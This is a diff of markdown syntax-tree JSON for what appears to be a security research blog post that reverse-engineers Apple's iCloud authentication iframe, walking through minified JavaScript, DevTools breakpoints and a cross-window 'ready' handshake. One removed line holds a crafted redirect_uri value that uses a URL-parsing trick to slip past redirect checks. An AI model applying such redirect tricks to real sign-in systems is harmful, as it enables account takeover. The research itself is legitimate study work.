>                       "line": 550,
>                       "column": 24,
>                       "offset": 26455
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "linkReference",
>                   "identifier": "5",
>                   "label": "5",
>                   "referenceType": "full",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "Steam Remote Code Execution",
>                       "position": {
>                         "start": {
>                           "line": 550,
>                           "column": 25,
>                           "offset": 26456
>                         },
>                         "end": {
>                           "line": 550,
>                           "column": 52,
>                           "offset": 26483
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 550,
>                       "column": 24,
>                       "offset": 26455
>                     },
>                     "end": {
>                       "line": 550,
>                       "column": 56,
>                       "offset": 26487
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". If an application does\nsomething, and we want to know why (in this case, why it won't load), we can set\nan 'XHR/fetch breakpoint' in Chrome Developer Tools's 'Sources' pane which looks\nfor that action -- in this case, loading\n",
>                   "position": {
>                     "start": {
>                       "line": 550,
>                       "column": 56,
>                       "offset": 26487
>                     },
>                     "end": {
>                       "line": 554,
>                       "column": 1,
>                       "offset": 26719
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://idmsa.apple.com/appleauth/jslog",
>                   "position": {
>                     "start": {
>                       "line": 554,
>                       "column": 1,
>                       "offset": 26719
>                     },
>                     "end": {
>                       "line": 554,
>                       "column": 42,
>                       "offset": 26760
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". ",
>                   "position": {
>                     "start": {
>                       "line": 554,
>                       "column": 42,
>                       "offset": 26760
>                     },
>                     "end": {
>                       "line": 554,
>                       "column": 44,
>                       "offset": 26762
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 548,
>                   "column": 1,
>                   "offset": 26277
>                 },
>                 "end": {
>                   "line": 554,
>                   "column": 44,
>                   "offset": 26762
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "definition",
>               "identifier": "5",
>               "label": "5",
>               "title": null,
>               "url": "https://hackerone.com/reports/409850",
>               "position": {
>                 "start": {
>                   "line": 556,
>                   "column": 1,
>                   "offset": 26766
>                 },
>                 "end": {
>                   "line": 556,
>                   "column": 42,
>                   "offset": 26807
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "When the breakpoint fires (when the error occurs), the Javascript application\nwill be paused until we tell it to continue again, allowing us to look at what's\ngoing on. We can then use the call stack, representing the sequence of function\ncalls that got us there to look at all the things that happened to lead up to\nthis error.",
>                   "position": {
>                     "start": {
>                       "line": 558,
>                       "column": 1,
>                       "offset": 26811
>                     },
>                     "end": {
>                       "line": 562,
>                       "column": 12,
>                       "offset": 27143
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 558,
>                   "column": 1,
>                   "offset": 26811
>                 },
>                 "end": {
>                   "line": 562,
>                   "column": 12,
>                   "offset": 27143
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "The breakpoint fires on a code context that looks like this:",
>                   "position": {
>                     "start": {
>                       "line": 565,
>                       "column": 1,
>                       "offset": 27149
>                     },
>                     "end": {
>                       "line": 565,
>                       "column": 61,
>                       "offset": 27209
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 565,
>                   "column": 1,
>                   "offset": 27149
>                 },
>                 "end": {
>                   "line": 565,
>                   "column": 61,
>                   "offset": 27209
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "e.details && (e.details = JSON.stringify(e.details)),\nt && r(t);\ntry {\n    var o = new XMLHttpRequest;\n    o.open(a.METHOD, d, !0),\n    o.setRequestHeader(\"Content-type\", \"application/json\"),\n    o.setRequestHeader(\"Accept\", \"application/json\"),\n    o.setRequestHeader(\"scnt\", p),\n    o.setRequestHeader(\"x-csrf-token\", m),\n    o.addEventListener(\"error\", n),\n    o.addEventListener(\"abort\", n),\n    o.onreadystatechange = function() {\n        o.status\n    }\n    ,\n    \"OFF\" !== c && (\"INFO\" === c || \"ERROR\" === c ? \"ERROR\" !== e.type.toUpperCase().trim() && \"INFO\" !== e.type.toUpperCase().trim() || o.send(JSON.stringify(e)) : \"DEBUG\" === c && o.send(JSON.stringify(e)))\n} catch (e) {}\n\n",
>               "position": {
>                 "start": {
>                   "line": 567,
>                   "column": 1,
>                   "offset": 27213
>                 },
>                 "end": {
>                   "line": 587,
>                   "column": 4,
>                   "offset": 27941
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "The Javascript code readers out there will probably be able to tell that this is just some pretty simple code which sends some arbitrary kind of information to the server.",
>                   "position": {
>                     "start": {
>                       "line": 589,
>                       "column": 1,
>                       "offset": 27945
>                     },
>                     "end": {
>                       "line": 589,
>                       "column": 172,
>                       "offset": 28116
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 589,
>                   "column": 1,
>                   "offset": 27945
>                 },
>                 "end": {
>                   "line": 589,
>                   "column": 172,
>                   "offset": 28116
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "If we step up in the call stack we get:",
>                   "position": {
>                     "start": {
>                       "line": 591,
>                       "column": 1,
>                       "offset": 28120
>                     },
>                     "end": {
>                       "line": 591,
>                       "column": 40,
>                       "offset": 28159
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 591,
>                   "column": 1,
>                   "offset": 28120
>                 },
>                 "end": {
>                   "line": 591,
>                   "column": 40,
>                   "offset": 28159
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "x(),\nb.a.log({\n    type: ot.JSLOG.TYPES.INFO,\n    title: ot.JSLOG.TITLES.APPLE_AUTH_DEBUG,\n    message: \"Launching AppleAuth application.\",\n    iframeId: p.a.iframeId || \"\"\n});\ntry {\n    s.a.USE_AUTH_EVENTS ? ft() : setTimeout(function() {\n        ft()\n    }, p.a.meta.FEConfiguration.appLoadDelay)\n} catch (t) {\n    b.a.log({\n        type: ot.JSLOG.TYPES.ERROR,\n        title: t.name,\n        message: t.message,\n        stacktrace: t.stack,\n        details: {\n            file: t.fileName,\n            lineno: t.lineNumber,\n            colno: t.columnNumber,\n            caught: \"YES\"\n        },\n        iframeId: p.a.iframeId || \"\"\n    }),\n    ut()\n}\n",
>               "position": {
>                 "start": {
>                   "line": 593,
>                   "column": 1,
>                   "offset": 28163
>                 },
>                 "end": {
>                   "line": 622,
>                   "column": 4,
>                   "offset": 28864
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "We're clearly getting somewhere. It looks like the server logging was triggered by a call to ",
>                   "position": {
>                     "start": {
>                       "line": 624,
>                       "column": 1,
>                       "offset": 28868
>                     },
>                     "end": {
>                       "line": 624,
>                       "column": 94,
>                       "offset": 28961
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "b.a.log()",
>                   "position": {
>                     "start": {
>                       "line": 624,
>                       "column": 94,
>                       "offset": 28961
>                     },
>                     "end": {
>                       "line": 624,
>                       "column": 105,
>                       "offset": 28972
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", which lets the system know what it's trying to do. The error we are likely seeing is from the ",
>                   "position": {
>                     "start": {
>                       "line": 624,
>                       "column": 105,
>                       "offset": 28972
>                     },
>                     "end": {
>                       "line": 624,
>                       "column": 201,
>                       "offset": 29068
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "try{} catch() {}",
>                   "position": {
>                     "start": {
>                       "line": 624,
>                       "column": 201,
>                       "offset": 29068
>                     },
>                     "end": {
>                       "line": 624,
>                       "column": 219,
>                       "offset": 29086
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " clause. Well, what are we trying?",
>                   "position": {
>                     "start": {
>                       "line": 624,
>                       "column": 219,
>                       "offset": 29086
>                     },
>                     "end": {
>                       "line": 624,
>                       "column": 253,
>                       "offset": 29120
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 624,
>                   "column": 1,
>                   "offset": 28868
>                 },
>                 "end": {
>                   "line": 624,
>                   "column": 253,
>                   "offset": 29120
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "try {\n    s.a.USE_AUTH_EVENTS ? ft() : setTimeout(function() {\n        ft()\n    }, p.a.meta.FEConfiguration.appLoadDelay)\n} catch (t) {",
>               "position": {
>                 "start": {
>                   "line": 626,
>                   "column": 1,
>                   "offset": 29124
>                 },
>                 "end": {
>                   "line": 632,
>                   "column": 4,
>                   "offset": 29283
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "There are two outcomes of this code: (1) the function ft() gets run immediately or (2) it gets run after a timeout specified by ",
>                   "position": {
>                     "start": {
>                       "line": 634,
>                       "column": 1,
>                       "offset": 29287
>                     },
>                     "end": {
>                       "line": 634,
>                       "column": 129,
>                       "offset": 29415
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "p.a.meta.FEConfiguration.applLoadDelay",
>                   "position": {
>                     "start": {
>                       "line": 634,
>                       "column": 129,
>                       "offset": 29415
>                     },
>                     "end": {
>                       "line": 634,
>                       "column": 169,
>                       "offset": 29455
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". What's ",
>                   "position": {
>                     "start": {
>                       "line": 634,
>                       "column": 169,
>                       "offset": 29455
>                     },
>                     "end": {
>                       "line": 634,
>                       "column": 178,
>                       "offset": 29464
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "ft()",
>                   "position": {
>                     "start": {
>                       "line": 634,
>                       "column": 178,
>                       "offset": 29464
>                     },
>                     "end": {
>                       "line": 634,
>                       "column": 184,
>                       "offset": 29470
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "? ",
>                   "position": {
>                     "start": {
>                       "line": 634,
>                       "column": 184,
>                       "offset": 29470
>                     },
>                     "end": {
>                       "line": 634,
>                       "column": 186,
>                       "offset": 29472
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "ft()",
>                   "position": {
>                     "start": {
>                       "line": 634,
>                       "column": 186,
>                       "offset": 29472
>                     },
>                     "end": {
>                       "line": 634,
>                       "column": 192,
>                       "offset": 29478
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", is, and I can't put this any other way -- a very beefy boy.",
>                   "position": {
>                     "start": {
>                       "line": 634,
>                       "column": 192,
>                       "offset": 29478
>                     },
>                     "end": {
>                       "line": 634,
>                       "column": 253,
>                       "offset": 29539
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 634,
>                   "column": 1,
>                   "offset": 29287
>                 },
>                 "end": {
>                   "line": 634,
>                   "column": 253,
>                   "offset": 29539
>                 },
>                 "indent": []
>               }
>             }
>           ],
>           "data": {
>             "hName": "section"
6365,6371c10555,10594
<           "type": "inlineCode",
<           "value": "redirect_uri=https://thomas@www.icloud.com",
<           "position": {
<             "start": {
<               "line": 363,
<               "column": 1,
<               "offset": 17634
---
>           "type": "section",
>           "depth": 2,
>           "children": [
>             {
>               "type": "heading",
>               "depth": 2,
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Analysing the 'Beefy Boy'",
>                   "position": {
>                     "start": {
>                       "line": 636,
>                       "column": 1,
>                       "offset": 29543
>                     },
>                     "end": {
>                       "line": 636,
>                       "column": 26,
>                       "offset": 29568
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 636,
>                   "column": 1,
>                   "offset": 29543
>                 },
>                 "end": {
>                   "line": 637,
>                   "column": 26,
>                   "offset": 29595
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
6373,6376c10596,10614
<             "end": {
<               "line": 363,
<               "column": 45,
<               "offset": 17678
---
>             {
>               "type": "definition",
>               "identifier": "analysing the 'beefy boy'",
>               "label": "Analysing the 'Beefy Boy'",
>               "title": null,
>               "url": "#url-parsing-my-old-friend",
>               "position": {
>                 "start": {
>                   "line": 638,
>                   "column": 1,
>                   "offset": 29597
>                 },
>                 "end": {
>                   "line": 638,
>                   "column": 56,
>                   "offset": 29652
>                 },
>                 "indent": []
>               }
6378c10616,12801
<             "indent": []
---
>             {
>               "type": "definition",
>               "identifier": "§6",
>               "label": "§6",
>               "title": null,
>               "url": "#url-parsing-my-old-frie",
>               "position": {
>                 "start": {
>                   "line": 639,
>                   "column": 1,
>                   "offset": 29654
>                 },
>                 "end": {
>                   "line": 639,
>                   "column": 31,
>                   "offset": 29684
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": ") {\negeneratorRuntime.async(function(t) {\n(; ; )\nswitch (t.prev = t.next) {\ncase 0:\n    if (s.a.USE_AUTH_EVENTS)\n        return s.a.on(\"config\", function(e) {\n            return regeneratorRuntime.async(function(t) {\n                for (; ; )\n                    switch (t.prev = t.next) {\n                    case 0:\n                        return t.prev = 0,\n                        p.a.envConfigFromConsumer = $(e),\n                        t.next = 4,\n                        regeneratorRuntime.awrap(lt(p.a.envConfigFromConsumer.context));\n                    case 4:\n                        Q(),\n                        Y(p.a, pt),\n                        t.next = 12;\n                        break;\n                    case 8:\n                        t.prev = 8,\n                        t.t0 = t.catch(0),\n                        b.a.log({\n                            type: ot.JSLOG.TYPES.ERROR,\n                            title: ot.JSLOG.TITLES.PMRPC_MESSAGE_SEQUENCE_ERROR,\n                            message: \"PMRPC Message Sequence log fail at AuthWidget.\",\n                            iframeId: p.a.iframeId || \"\",\n                            details: {\n                                m: s.a.getLogs()\n                            }\n                        }),\n                        \"object\" === rt(c()(t.t0, \"jqXHR\", void 0)) ? ct(void 0, Object(v.b)(m.a.FAILED_TO_VALIDATE_CONTEXT, \"Provided context [ \".concat(p.a.envConfigFromConsumer.context, \" ] is not supported for this application.\"))) : (b.a.log({\n                            type: ot.JSLOG.TYPES.ERROR,\n                            title: ot.JSLOG.TITLES.APPLE_AUTH_DEBUG,\n                            message: c()(t.t0, \"message\", \"Unexpected error.\"),\n                            stacktrace: c()(t.t0, \"stack\", \"Stacktrace not found.\"),\n                            iframeId: p.a.iframeId || \"\"\n                        }),\n                        ut(t.t0));\n// ... way more after this ...",
>               "position": {
>                 "start": {
>                   "line": 641,
>                   "column": 1,
>                   "offset": 29688
>                 },
>                 "end": {
>                   "line": 683,
>                   "column": 4,
>                   "offset": 31712
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "This is code that no human was ever meant to read, produced by thousands of lines of machine optimization. And I'm sorry. But I love reading this stuff.",
>                   "position": {
>                     "start": {
>                       "line": 685,
>                       "column": 1,
>                       "offset": 31716
>                     },
>                     "end": {
>                       "line": 685,
>                       "column": 153,
>                       "offset": 31868
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 685,
>                   "column": 1,
>                   "offset": 31716
>                 },
>                 "end": {
>                   "line": 685,
>                   "column": 153,
>                   "offset": 31868
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "A big part in making this code so inaccessible is the ",
>                   "position": {
>                     "start": {
>                       "line": 687,
>                       "column": 1,
>                       "offset": 31872
>                     },
>                     "end": {
>                       "line": 687,
>                       "column": 55,
>                       "offset": 31926
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "regeneratorRuntime.async()",
>                   "position": {
>                     "start": {
>                       "line": 687,
>                       "column": 55,
>                       "offset": 31926
>                     },
>                     "end": {
>                       "line": 687,
>                       "column": 83,
>                       "offset": 31954
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " call. ",
>                   "position": {
>                     "start": {
>                       "line": 687,
>                       "column": 83,
>                       "offset": 31954
>                     },
>                     "end": {
>                       "line": 687,
>                       "column": 90,
>                       "offset": 31961
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "regeneratorRuntime",
>                   "position": {
>                     "start": {
>                       "line": 687,
>                       "column": 90,
>                       "offset": 31961
>                     },
>                     "end": {
>                       "line": 687,
>                       "column": 110,
>                       "offset": 31981
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is a shim which lets code written for modern browsers supporting ",
>                   "position": {
>                     "start": {
>                       "line": 687,
>                       "column": 110,
>                       "offset": 31981
>                     },
>                     "end": {
>                       "line": 687,
>                       "column": 176,
>                       "offset": 32047
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "async",
>                   "position": {
>                     "start": {
>                       "line": 687,
>                       "column": 176,
>                       "offset": 32047
>                     },
>                     "end": {
>                       "line": 687,
>                       "column": 183,
>                       "offset": 32054
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " and ",
>                   "position": {
>                     "start": {
>                       "line": 687,
>                       "column": 183,
>                       "offset": 32054
>                     },
>                     "end": {
>                       "line": 687,
>                       "column": 188,
>                       "offset": 32059
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "await",
>                   "position": {
>                     "start": {
>                       "line": 687,
>                       "column": 188,
>                       "offset": 32059
>                     },
>                     "end": {
>                       "line": 687,
>                       "column": 195,
>                       "offset": 32066
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " run in older browsers. It will have been generated by a transpiler which analyzes the code to make it smaller, more efficient and support more browsers (almost certianly ",
>                   "position": {
>                     "start": {
>                       "line": 687,
>                       "column": 195,
>                       "offset": 32066
>                     },
>                     "end": {
>                       "line": 687,
>                       "column": 366,
>                       "offset": 32237
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "linkReference",
>                   "identifier": "6",
>                   "label": "6",
>                   "referenceType": "full",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "Babel",
>                       "position": {
>                         "start": {
>                           "line": 687,
>                           "column": 367,
>                           "offset": 32238
>                         },
>                         "end": {
>                           "line": 687,
>                           "column": 372,
>                           "offset": 32243
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 687,
>                       "column": 366,
>                       "offset": 32237
>                     },
>                     "end": {
>                       "line": 687,
>                       "column": 376,
>                       "offset": 32247
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ").",
>                   "position": {
>                     "start": {
>                       "line": 687,
>                       "column": 376,
>                       "offset": 32247
>                     },
>                     "end": {
>                       "line": 687,
>                       "column": 378,
>                       "offset": 32249
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 687,
>                   "column": 1,
>                   "offset": 31872
>                 },
>                 "end": {
>                   "line": 687,
>                   "column": 378,
>                   "offset": 32249
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "definition",
>               "identifier": "6",
>               "label": "6",
>               "title": null,
>               "url": "https://babeljs.io/",
>               "position": {
>                 "start": {
>                   "line": 689,
>                   "column": 1,
>                   "offset": 32253
>                 },
>                 "end": {
>                   "line": 689,
>                   "column": 25,
>                   "offset": 32277
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "We also don't need to worry about anything but ",
>                   "position": {
>                     "start": {
>                       "line": 691,
>                       "column": 1,
>                       "offset": 32281
>                     },
>                     "end": {
>                       "line": 691,
>                       "column": 48,
>                       "offset": 32328
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "case 8",
>                   "position": {
>                     "start": {
>                       "line": 691,
>                       "column": 48,
>                       "offset": 32328
>                     },
>                     "end": {
>                       "line": 691,
>                       "column": 56,
>                       "offset": 32336
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " here because that's where our ",
>                   "position": {
>                     "start": {
>                       "line": 691,
>                       "column": 56,
>                       "offset": 32336
>                     },
>                     "end": {
>                       "line": 691,
>                       "column": 87,
>                       "offset": 32367
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "PMRPC Sequence Message log Fail At AuthWidget",
>                   "position": {
>                     "start": {
>                       "line": 691,
>                       "column": 87,
>                       "offset": 32367
>                     },
>                     "end": {
>                       "line": 691,
>                       "column": 134,
>                       "offset": 32414
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " error is coming from. Case 0 is clearly doing some kind of arcane ritual to configure itself or something anyway and we shouldn't disturb it.",
>                   "position": {
>                     "start": {
>                       "line": 691,
>                       "column": 134,
>                       "offset": 32414
>                     },
>                     "end": {
>                       "line": 691,
>                       "column": 276,
>                       "offset": 32556
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 691,
>                   "column": 1,
>                   "offset": 32281
>                 },
>                 "end": {
>                   "line": 691,
>                   "column": 276,
>                   "offset": 32556
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Case 8 is a sequence of ",
>                   "position": {
>                     "start": {
>                       "line": 693,
>                       "column": 1,
>                       "offset": 32560
>                     },
>                     "end": {
>                       "line": 693,
>                       "column": 25,
>                       "offset": 32584
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "Promise().then().then()",
>                   "position": {
>                     "start": {
>                       "line": 693,
>                       "column": 25,
>                       "offset": 32584
>                     },
>                     "end": {
>                       "line": 693,
>                       "column": 50,
>                       "offset": 32609
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "s which are another way other than ",
>                   "position": {
>                     "start": {
>                       "line": 693,
>                       "column": 50,
>                       "offset": 32609
>                     },
>                     "end": {
>                       "line": 693,
>                       "column": 85,
>                       "offset": 32644
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "async",
>                   "position": {
>                     "start": {
>                       "line": 693,
>                       "column": 85,
>                       "offset": 32644
>                     },
>                     "end": {
>                       "line": 693,
>                       "column": 92,
>                       "offset": 32651
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "/",
>                   "position": {
>                     "start": {
>                       "line": 693,
>                       "column": 92,
>                       "offset": 32651
>                     },
>                     "end": {
>                       "line": 693,
>                       "column": 93,
>                       "offset": 32652
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "await",
>                   "position": {
>                     "start": {
>                       "line": 693,
>                       "column": 93,
>                       "offset": 32652
>                     },
>                     "end": {
>                       "line": 693,
>                       "column": 100,
>                       "offset": 32659
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " of managing asynchronous operations. If any ",
>                   "position": {
>                     "start": {
>                       "line": 693,
>                       "column": 100,
>                       "offset": 32659
>                     },
>                     "end": {
>                       "line": 693,
>                       "column": 145,
>                       "offset": 32704
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "then()",
>                   "position": {
>                     "start": {
>                       "line": 693,
>                       "column": 145,
>                       "offset": 32704
>                     },
>                     "end": {
>                       "line": 693,
>                       "column": 153,
>                       "offset": 32712
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " operation fails, the ",
>                   "position": {
>                     "start": {
>                       "line": 693,
>                       "column": 153,
>                       "offset": 32712
>                     },
>                     "end": {
>                       "line": 693,
>                       "column": 175,
>                       "offset": 32734
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "catch()",
>                   "position": {
>                     "start": {
>                       "line": 693,
>                       "column": 175,
>                       "offset": 32734
>                     },
>                     "end": {
>                       "line": 693,
>                       "column": 184,
>                       "offset": 32743
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " clause is called, which results in us seeing the error we're seeing. Here's the first operation:",
>                   "position": {
>                     "start": {
>                       "line": 693,
>                       "column": 184,
>                       "offset": 32743
>                     },
>                     "end": {
>                       "line": 693,
>                       "column": 281,
>                       "offset": 32840
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 693,
>                   "column": 1,
>                   "offset": 32560
>                 },
>                 "end": {
>                   "line": 693,
>                   "column": 281,
>                   "offset": 32840
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "new Promise(function(e, n) {\n    it.call({\n        destination: window.parent,\n        publicProcedureName: \"ready\",\n        params: [{\n            iframeTitle: d.a.getString(\"iframeTitle\")\n        }],\n        onSuccess: function(t) {\n            e(t)\n        },\n        onError: function(t) {\n            n(t)\n        },\n        retries: p.a.meta.FEConfiguration.pmrpcRetryCount,\n        timeout: p.a.meta.FEConfiguration.pmrpcTimeout,\n        destinationDomain: p.a.destinationDomain\n    })\n}",
>               "position": {
>                 "start": {
>                   "line": 695,
>                   "column": 1,
>                   "offset": 32844
>                 },
>                 "end": {
>                   "line": 714,
>                   "column": 4,
>                   "offset": 33375
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "inlineCode",
>                   "value": "window.parent",
>                   "position": {
>                     "start": {
>                       "line": 716,
>                       "column": 1,
>                       "offset": 33379
>                     },
>                     "end": {
>                       "line": 716,
>                       "column": 16,
>                       "offset": 33394
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is the key here. ",
>                   "position": {
>                     "start": {
>                       "line": 716,
>                       "column": 16,
>                       "offset": 33394
>                     },
>                     "end": {
>                       "line": 716,
>                       "column": 34,
>                       "offset": 33412
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.parent",
>                   "position": {
>                     "start": {
>                       "line": 716,
>                       "column": 34,
>                       "offset": 33412
>                     },
>                     "end": {
>                       "line": 716,
>                       "column": 49,
>                       "offset": 33427
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is a reference to the embedding window (i.e. in the correct case, iCloud). and it's calling \"ready\". I imagine it expects a response and since we're not giving one it's failing. As far as this gets us, it's kind of something we could already intuit as it's how all these systems really work. We're going to have to snoop on a successful initialization conversation and try to replicate it.",
>                   "position": {
>                     "start": {
>                       "line": 716,
>                       "column": 49,
>                       "offset": 33427
>                     },
>                     "end": {
>                       "line": 716,
>                       "column": 439,
>                       "offset": 33817
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 716,
>                   "column": 1,
>                   "offset": 33379
